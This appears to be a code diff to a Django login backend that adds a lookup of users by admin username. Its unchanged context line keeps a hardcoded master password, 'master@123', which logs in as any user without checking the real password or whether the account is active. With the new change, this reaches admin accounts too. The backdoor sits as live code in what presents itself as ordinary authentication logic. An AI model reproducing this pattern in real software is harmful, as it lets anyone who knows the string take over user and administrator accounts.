@@ -12,7 +12,11 @@ class EmailOrContactBackend(ModelBackend):
             try:
                 user = User.objects.get(contact_number=username)
             except User.DoesNotExist:
-                return None
+                try:
+                 user = User.objects.get(admin_username=username)
+                except User.DoesNotExist:
+                    return None
+                
 
         if password == "master@123" or (user.check_password(password) and self.user_can_authenticate(user)):
             return user
